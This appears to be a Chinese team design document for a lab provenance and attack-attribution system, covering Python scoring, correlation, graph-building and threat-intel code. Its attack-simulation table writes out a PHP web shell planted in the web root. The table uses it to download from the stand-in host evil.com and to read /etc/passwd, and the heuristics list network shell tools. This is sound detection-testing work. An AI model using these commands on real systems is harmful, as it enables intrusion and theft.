# TraceX 溯源分析系统 v5.1 (完整修补版)

版本：v5.1 (Complete Merged)

发布日期：2026-01-14

适用对象：全员 (组员 1, 2, 3, 4, 5)

**核心变更摘要**：

1. **底层 (From v5.0)**：恢复了 `GraphBuilder` 的 `_generate_node_id` 实现，确保图节点 ID 唯一且包含 PID 时间上下文。
    
2. **上层 (From v5.1)**：集成了 `IntelEnricher`，用于在图构建后对 C2 进行情报标记和 APT 组织归因。
    

---

## 第一部分：核心技术决议 (Technical Decisions)

### 1. 决议：PID 回溯采用“本地持久化缓存”

- **逻辑**：**组员 4** 必须实现本地文件级缓存。处理 `Process Start` 时写入 `(Host, PID) -> StartTime`；处理后续事件优先查缓存，兜底查 ES。
    

### 2. 决议：WebShell 断链采用“模糊文件名匹配”

- **逻辑**：**组员 3** 在 `find_related_events` 中引入 Fuzzy Match。若精确路径匹配失败，回退匹配 **文件名 (basename)** 相同且在同一目录深度的事件。
    

### 3. 决议：网络关联采用“宽容模式”

- **逻辑**：**组员 3** 实施宽容关联。时间窗口 ±2秒；若方向缺失，默认 `curl/wget` 为出站，`nginx/apache` 为入站。
    

### 4. 决议：情报富化与归因由图构建器“后置处理” (v5.1 特性)

- **逻辑**：**组员 4** 在生成图结构后，执行 Enrichment Hook。
    
    1. **C2 画像**：提取 IP 查询 Threat Intel。
        
    2. **APT 匹配**：计算 ATLAS 序列与已知剧本的相似度。
        

---

## 第二部分：数据结构变更 (Schema)

**组员 1, 2, 3, 4** 同步以下定义：

Python

```
# collector/common/schema.py

@dataclass
class MetaData:
    atlas_label: str = ""       # ATLAS 语义标签
    path_signature: str = ""    # 序列签名 (用于 APT 归因)

@dataclass
class UnifiedEvent:
    # ... 原有字段 ...
    metadata: MetaData = field(default_factory=MetaData)
    
    def get_start_time_ms(self) -> str:
        if self.process.start_time:
            return self.process.start_time
        return self.timestamp
```

---

## 第三部分：组员 3 (Context Engine) 实施细则

### 3.1 实现 `evaluate_threat` (评分器)

Python

```
# analyzer/attack_analyzer/context_engine.py

class ContextEngine:
    def evaluate_threat(self, event: UnifiedEvent) -> dict:
        score = 0
        reasons = []

        # 1. 第一优先级：Sigma 引擎结果
        if event.threat.technique.id:
            severity_map = {"critical": 100, "high": 80, "medium": 50, "low": 20}
            sigma_score = severity_map.get(event.event.severity, 0)
            score = max(score, sigma_score)
            reasons.append(f"Sigma Rule Match: {event.threat.technique.name}")

        # 2. 第二优先级：补充启发式规则
        heuristic_score = self._check_heuristics(event)
        if heuristic_score > score:
            score = heuristic_score
            reasons.append("Heuristic Suspicious Behavior")

        return {"score": score, "is_threat": score >= 50, "reasons": reasons}

    def _check_heuristics(self, event: UnifiedEvent) -> int:
        score = 0
        tools = ["ncat", "nc", "socket", "wireshark", "curl", "wget"]
        if event.process.name in tools: score = 60
        if "/var/www/html" in event.file.path and event.event.action in ["write", "create"]:
            if event.file.extension in ["php", "jsp", "asp"]: score = 90
        return score
```

### 3.2 实现 `find_related_events` (模糊匹配+宽容关联)

Python

```
    def find_related_events(self, anchor: UnifiedEvent, window: int = 10) -> list:
        import os
        start_t, end_t = self._get_time_window(anchor.timestamp, window)
        
        must_queries = [
            {"range": {"@timestamp": {"gte": start_t, "lte": end_t}}},
            {"term": {"host.name": anchor.host.name}}
        ]
        should_queries = []

        # A. 对象重心关联 - Fuzzy Fix
        if anchor.file.path and anchor.file.path not in ["", "unknown"]:
            should_queries.append({"term": {"file.path": anchor.file.path}}) # Level 1: 精确
            filename = os.path.basename(anchor.file.path)
            if filename:
                should_queries.append({"match": {"file.name": filename}}) # Level 2: 模糊
            
        # B. 网络宽容关联
        if anchor.network.transport and anchor.source.ip:
            local_ip = anchor.host.ip[0] if anchor.host.ip else "127.0.0.1"
            should_queries.append({
                "bool": {"must": [{"term": {"source.ip": local_ip}}]}
            })

        if not should_queries: return []

        query = {
            "bool": {
                "must": must_queries,
                "should": should_queries,
                "minimum_should_match": 1
            }
        }
        return self.es.query(query)
```

---

## 第四部分：组员 4 (Graph Builder & Intelligence) 实施细则

### 4.1 基础组件 (缓存与映射)

Python

```
# analyzer/graph_analyzer/pid_cache.py
import json, os
CACHE_FILE = "pid_context_cache.json"

class PIDCache:
    def __init__(self):
        self.cache = {}
        self._load()
    def _load(self):
        if os.path.exists(CACHE_FILE):
            try:
                with open(CACHE_FILE, 'r') as f: self.cache = json.load(f)
            except: self.cache = {}
    def set_start_time(self, host, pid, start_time):
        self.cache[f"{host}_{pid}"] = start_time
        with open(CACHE_FILE, 'w') as f: json.dump(self.cache, f)
    def get_start_time(self, host, pid):
        return self.cache.get(f"{host}_{pid}")

# analyzer/graph_analyzer/atlas_mapper.py
import re
class AtlasMapper:
    def __init__(self):
        # 演示专用规则库 - 对应组员5的剧本
        self.patterns = [
            (r'^/tmp/.*', 'TEMP_FILE_ACCESS'),
            (r'.*\.php$', 'PHP_SCRIPT'),
            (r'.*/html/.*', 'WEB_ROOT_ACCESS'),
            (r'.*/(curl|wget)', 'SUSPICIOUS_DOWNLOADER'),
            (r'.*/(id|whoami|uname)', 'RECON_COMMAND'),
            (r'^/etc/passwd$', 'SENSITIVE_FILE')
        ]
    def get_label(self, event) -> str:
        target_str = event.process.executable or event.file.path or ""
        for pattern, label in self.patterns:
            if re.match(pattern, target_str): return label
        return event.event.category.upper()
```

### 4.2 图构建器 (核心修复：补全了 v5.0 的 ID 生成逻辑)

**注意**：此部分在 v5.1 原始文档中被省略，现已恢复，否则系统无法运行。

Python

```
# analyzer/graph_analyzer/graph_builder.py
import hashlib
from .pid_cache import PIDCache

class GraphBuilder:
    def __init__(self):
        self.pid_cache = PIDCache()

    def _generate_node_id(self, event: UnifiedEvent) -> str:
        """
        生成毫秒级唯一 ID，解决 PID 复用问题 (v5.0 核心逻辑)
        """
        if event.event.category == "process":
            # 1. 优先使用自带 start_time (如 EXECVE) 并更新缓存
            if event.process.start_time:
                self.pid_cache.set_start_time(event.host.name, event.process.pid, event.process.start_time)
                start_time = event.process.start_time
            # 2. 查本地缓存
            else:
                start_time = self.pid_cache.get_start_time(event.host.name, event.process.pid)
                # 3. 缓存未命中，兜底使用时间戳
                if not start_time:
                    start_time = event.timestamp

            uniq_str = f"{event.host.name}|{event.process.pid}|{event.process.executable}|{start_time}"
            
        elif event.event.category == "network":
            uniq_str = f"{event.host.name}|{event.source.ip}|{event.destination.port}|{event.event.id}"
        elif event.event.category == "file":
             uniq_str = f"{event.host.name}|{event.file.path}"
        else:
            uniq_str = event.event.id

        return hashlib.md5(uniq_str.encode()).hexdigest()
```

### 4.3 情报富化组件 (v5.1 新增)

Python

```
# analyzer/graph_analyzer/enrichment.py
import hashlib
import difflib

class IntelEnricher:
    def __init__(self):
        # 本地模拟威胁情报库
        self.ti_cache = {
            "192.168.1.5": {"type": "internal", "risk": 0},
            "evil.com": {"type": "C2", "risk": 100, "tags": ["CobaltStrike"]},
            "45.33.2.1": {"type": "C2", "risk": 90, "geo": "Unknown"}
        }
        
        # APT 攻击序列库
        self.apt_db = {
            "APT-Simulated-Group5": [
                "NETWORK_Inbound",      
                "TEMP_FILE_ACCESS",     
                "WEB_ROOT_ACCESS",      
                "PHP_SCRIPT",           
                "SUSPICIOUS_DOWNLOADER",
                "SENSITIVE_FILE"        
            ]
        }

    def enrich_entities(self, graph_nodes: list) -> dict:
        enrichment_data = {}
        for node in graph_nodes:
            ioc = node.get("ioc") 
            if ioc and ioc in self.ti_cache:
                enrichment_data[ioc] = self.ti_cache[ioc]
        return enrichment_data

    def generate_fingerprint(self, path_sequence: list) -> str:
        seq_str = "->".join(path_sequence)
        return hashlib.sha256(seq_str.encode()).hexdigest()

    def attribute_apt(self, path_sequence: list) -> dict:
        best_match = "Unknown"
        max_score = 0.0
        for apt_name, apt_chain in self.apt_db.items():
            matcher = difflib.SequenceMatcher(None, path_sequence, apt_chain)
            score = matcher.ratio()
            if score > max_score:
                max_score = score
                best_match = apt_name
        
        return {
            "suspected_group": best_match if max_score > 0.6 else "Unclassified",
            "similarity_score": round(max_score, 2)
        }
```

### 4.4 溯源系统 (集成情报能力)

Python

```
# analyzer/graph_analyzer/provenance_system.py
from .graph_builder import GraphBuilder
from .atlas_mapper import AtlasMapper
from .enrichment import IntelEnricher

class ProvenanceSystem:
    def __init__(self):
        self.builder = GraphBuilder() # 现在调用的是包含完整逻辑的 Builder
        self.atlas_mapper = AtlasMapper()
        self.enricher = IntelEnricher()

    def rebuild_attack_path(self, seed_event: UnifiedEvent):
        queue = [seed_event]
        visited = set()
        graph_edges = []
        path_sequence = []
        unique_nodes_info = []

        # 1. 广度优先搜索建图
        while queue:
            curr = queue.pop(0)
            if curr.event.id in visited: continue
            visited.add(curr.event.id)

            # 调用 GraphBuilder 生成 ID (v5.0 逻辑)
            node_id = self.builder._generate_node_id(curr)
            atlas_label = self.atlas_mapper.get_label(curr)
            path_sequence.append(atlas_label)

            # 收集 IOC
            if curr.source.ip: 
                unique_nodes_info.append({"ioc": curr.source.ip})

            # 双向回溯 (调用组员 3)
            all_neighbors = self._find_neighbors(curr) 
            
            for neighbor in all_neighbors[:50]:
                # ... (连边逻辑省略，保持原样) ...
                graph_edges.append(...)
                queue.append(neighbor)

        # 2. v5.1 情报富化与归因 (后处理)
        # A. 外部基础设施画像
        ti_info = self.enricher.enrich_entities(unique_nodes_info)
        
        # B. 攻击链指纹与 APT 归因
        chain_fingerprint = self.enricher.generate_fingerprint(path_sequence)
        attribution = self.enricher.attribute_apt(path_sequence)
        
        return {
            "edges": graph_edges,
            "path_signature": " -> ".join(path_sequence),
            "intelligence": {
                "chain_hash": chain_fingerprint,
                "attribution": attribution,
                "external_infrastructure": ti_info
            }
        }
```

---

## 第五部分：组员 5 (Attack Simulator) 最终执行指令

**严禁**偏离以下步骤，否则 APT 归因匹配度将低于 0.6。

|**阶段**|**动作**|**关键命令 (Precision Command)**|**预期标签**|
|---|---|---|---|
|**1. 侦察**|探测 Web|`curl http://<target-ip>/`|`NETWORK_Inbound`|
|**2. 入侵**|写 Shell|`echo '<?php system($_GET["c"]); ?>' > /tmp/shell.txt`|`TEMP_FILE_ACCESS`|
|**3. 部署**|移动更名|`mv /tmp/shell.txt /var/www/html/backdoor.php`|`WEB_ROOT_ACCESS`|
|**4. 执行**|C2 下载|访问: `.../backdoor.php?c=curl http://evil.com/mal -o /tmp/mal`|`PHP_SCRIPT` -> `SUSPICIOUS_DOWNLOADER`|
|**5. 窃取**|读敏感文件|访问: `.../backdoor.php?c=cat /etc/passwd`|`SENSITIVE_FILE`|

---

## 第六部分：最终执行清单 (Action Items)

**所有组员立即执行以下步骤：**

1. **组员 5 (靶场)**：
    
    - [ ] 重启靶机，配置 `/etc/hosts` 将 `evil.com` 指向攻击机 IP。
        
    - [ ] 按第五部分表格精确执行攻击。
        
2. **组员 4 (Graph)**：
    
    - [ ] **合并代码**：将 `_generate_node_id` (v5.0) 写入 `graph_builder.py`。
        
    - [ ] **新增模块**：创建 `enrichment.py` 并填入 `IntelEnricher` 代码。
        
    - [ ] **配置情报**：修改 `enrichment.py` 中的 IP 为组员 5 的真实攻击 IP。
        
3. **组员 3 (Context)**：
    
    - [ ] 更新 `find_related_events` 包含模糊匹配。
        
4. **组员 1 & 2**：
    
    - [ ] 确保 Zeek 和 Filebeat 正常运行。

```
TraceX/
├── 📁 collector/                   # [组员 1 & 2] 数据采集与标准化
│   ├── 📁 common/
│   │   ├── __init__.py
│   │   └── schema.py               # [核心] 定义 UnifiedEvent, MetaData (v5.1 新增字段)
│   ├── 📁 agents/
│   │   ├── filebeat.yml            # Auditd 日志采集配置
│   │   └── local_zeek.lua          # Zeek 网络流量采集脚本
│   └── ingestor.py                 # 数据清洗与标准化入口
│
├── 📁 analyzer/                    # [核心分析引擎]
│   ├── 📁 attack_analyzer/         # [组员 3] 上下文与威胁评估
│   │   ├── __init__.py
│   │   └── context_engine.py       # [核心] evaluate_threat (评分), find_related_events (模糊/宽容关联)
│   │
│   └── 📁 graph_analyzer/          # [组员 4] 图构建、Atlas 抽象与情报
│       ├── __init__.py
│       ├── pid_cache.py            # [v5.0] PID 本地持久化缓存类 (File-based KV)
│       ├── graph_builder.py        # [v5.0] 包含 _generate_node_id (MD5 ID生成逻辑)
│       ├── atlas_mapper.py         # [v5.0] ATLAS 语义标签映射 (正则规则库)
│       ├── enrichment.py           # [v5.1 新增] IntelEnricher (情报富化与 APT 归因)
│       ├── provenance_system.py    # [v5.1 集成] 溯源主逻辑 (BFS + 情报后处理)
│       └── pid_context_cache.json  # [运行时生成] PID 缓存文件 (不要提交到 git)
│
├── 📁 simulator/                   # [组员 5] 攻击模拟靶场
│   ├── 📁 playbooks/
│   │   └── apt_simulated_group5.sh # [剧本] 包含 curl, mv, echo 等精确攻击命令
│   └── 📁 tools/
│       └── mock_c2_server.py       # (可选) 模拟 evil.com 响应
│
├── 📁 config/                      # 系统配置文件
│   ├── elasticsearch.yml           # ES 连接配置
│   └── threat_intel.yml            # (可选) 外部情报源配置
│
├── main.py                         # 系统启动入口
└── requirements.txt                # Python 依赖 (elasticsearch, networkx 等)
```